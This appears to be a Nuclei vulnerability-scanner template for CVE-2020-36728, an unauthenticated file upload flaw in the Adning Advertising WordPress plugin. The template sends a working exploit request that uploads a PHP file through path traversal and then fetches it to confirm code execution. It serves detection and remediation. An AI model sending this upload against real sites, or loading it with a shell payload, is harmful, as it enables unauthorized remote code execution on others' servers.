flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, '{{filename}}','tmp_name','grid_item','success')
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=_ning_upload_image HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=b214a08e1c094defed15a5cc4c2285ee


    --b214a08e1c094defed15a5cc4c2285ee

    Content-Disposition: form-data; name="allowed_file_types"


    php,jpg,jpeg

    --b214a08e1c094defed15a5cc4c2285ee

    Content-Disposition: form-data; name="upload"


    {"dir": "../"}

    --b214a08e1c094defed15a5cc4c2285ee

    Content-Disposition: form-data; name="files[]"; filename="{{filename}}.php"


    <?php  echo base64_decode($_GET["input"]);?>

    --b214a08e1c094defed15a5cc4c2285ee--

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, '{{marker}}')
    type: dsl
  raw:
  - 'GET /{{filename}}.php?input={{base64(marker)}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2020-36728
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:tunasite:adning_advertising:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2020-36728
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 6.5
    epss-percentile: 0.98943
    epss-score: 0.77717
  description: 'The Adning Advertising plugin for WordPress versions below 1.5.6 is
    vulnerable to arbitrary file upload, allowing attackers to upload malicious files
    to the server.

    '
  impact: 'Unauthenticated attackers can upload malicious files to achieve remote
    code execution, potentially compromising the entire WordPress site and server.

    '
  metadata:
    fofa-query: body="served by Adning"
    framework: wordpress
    max-request: 2
    product: adning_advertising
    vendor: tunasite
    verified: true
  name: WordPress Plugin Adning Advertising < 1.5.6 - Arbitrary File Upload
  reference:
  - https://www.wordfence.com/blog/2020/07/critical-vulnerabilities-patched-in-adning-advertising-plugin/
  - https://blog.nintechnet.com/critical-vulnerability-in-adning-advertising-plugin-actively-exploited-in-the-wild/
  - https://codecanyon.net/item/wp-pro-advertising-system-all-in-one-ad-manager/269693
  - https://nvd.nist.gov/vuln/detail/CVE-2020-36728
  remediation: 'Upgrade to Adning Advertising version 1.5.6 or later.

    '
  severity: medium
  tags: cve,cve202,wordpress,wp,wp-plugin,intrusive,file-upload,adning,rce,vkev,vuln
variables:
  filename: '{{randbase(8)}}'
  marker: '{{randstr}}'
